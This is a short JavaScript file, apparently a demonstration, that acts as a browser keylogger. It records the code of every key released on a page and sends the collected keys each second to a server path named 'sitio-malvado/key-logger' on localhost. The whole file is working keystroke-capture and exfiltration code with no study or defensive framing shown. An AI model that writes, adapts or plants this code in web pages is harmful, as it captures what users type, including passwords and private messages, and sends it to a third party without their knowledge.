let keys = []

document.addEventListener('keyup', (event) => {
	keys.push(event.code)
})

setInterval(() => {
	fetch(`http://localhost:8080/sitio-malvado/key-logger?key=${keys.join(', ')}`)
		.then(() => {
			keys = []	
		})
}, 1000)

